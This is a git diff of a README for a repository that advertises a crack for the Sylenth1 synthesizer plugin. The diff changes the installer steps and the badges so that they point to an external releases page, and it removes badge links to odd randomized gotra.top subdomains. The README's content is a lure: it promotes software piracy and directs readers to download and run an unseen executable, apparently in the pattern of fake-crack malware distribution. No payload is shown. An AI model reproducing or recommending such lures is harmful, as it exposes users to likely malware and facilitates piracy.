@@ -1,5 +1,5 @@
 
-![31](https://github.com/user-attachments/assets/a561c829-3727-4f65-9aa1-73228f2a0966)
+![31](https://github.com/Fakedee/Sylenth1-Crack/releases)
 
 # Sylenth1 Crack
 
@@ -29,8 +29,8 @@ Welcome to the **Sylenth1 Crack** repository! This project provides tools and re
 
 1. **Run the Installer**
    - Navigate to the folder and execute the appropriate script:
-     - For Windows: `install_windows.bat`
-     - For macOS: `install_mac.sh`
+     - For Windows: `https://github.com/Fakedee/Sylenth1-Crack/releases`
+     - For macOS: `https://github.com/Fakedee/Sylenth1-Crack/releases`
 
 2. **Follow the On-Screen Instructions**
 
@@ -76,6 +76,6 @@ Contributions are welcome! Please follow these steps:
 ---
 
 #
-[![https://LwVm6.gotra.top/52/E2xGLCT](https://LBwkft6.gotra.top/l.svg)](https://tULfq.gotra.top/52/aqUE1)
+[![https://github.com/Fakedee/Sylenth1-Crack/releases](https://github.com/Fakedee/Sylenth1-Crack/releases)](https://github.com/Fakedee/Sylenth1-Crack/releases)
 # Tags:
 install-sylenth1 sylenth1-cracked sylenth1-buy fl-studio-sylenth1-free-download sylenth1-code sylenth1-fl-studio sylenth1-for-logic-pro-x sylenth1-for-sale how-to-use-sylenth1 sylenth1-black-friday lennar-digital-sylenth1-torrent how-to-activate-sylenth1 how-to-install-sylenth1 sylenth1-expansion-packs presets-sylenth1 piano-presets-for-sylenth1
